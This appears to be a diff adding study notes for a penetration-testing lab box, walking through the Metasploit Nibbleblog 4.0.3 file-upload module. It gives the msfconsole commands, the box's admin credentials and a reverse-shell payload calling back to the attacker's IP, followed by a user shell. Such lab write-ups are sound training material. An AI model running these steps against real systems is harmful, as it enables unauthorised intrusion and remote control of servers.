@@ -1,0 +1,12 @@
+- Metasploit offers a ready exploit for this box: `exploit/multi/http/nibbleblog_file_upload` (targets Nibbleblog 4.0.3).
+- Start Metasploit (`msfconsole`) and search for the module: `search nibbleblog`.
+- Load the module (by index or name), e.g. `use 0` or `use exploit/multi/http/nibbleblog_file_upload`.
+- Set target and attacker addresses: `set rhosts <target IP>` and `set lhost <your tun0 IP>`.
+- Check required options with `show options` (module options include USERNAME, PASSWORD, TARGETURI, RHOSTS, RPORT, etc.).
+- Configure credentials and path for this box: `set username admin`, `set password nibbles`, `set targeturi nibbleblog`.
+- Change payload to a simple reverse shell for this exercise: `set payload generic/shell_reverse_tcp` (also shows payload options like LHOST/LPORT).
+- Run the exploit with `exploit` — Metasploit starts a handler and (in this run) opened a command shell session.
+- Confirm shell and identity (example output: `id` → `uid=1001(nibbler) gid=1001(nibbler)`).
+- From the obtained user shell, continue the same privilege-escalation path described elsewhere (enumerate and escalate).
+- Advice / best practices: practice both manual and Metasploit methods, try different tools/approaches, take detailed notes, and attempt alternative enumeration/priv-esc routes (e.g., kernel/service exploits or other web-app abuse).
+- Safety note: don’t deploy or reuse Nibbleblog 4.0.3 in production — it’s vulnerable.
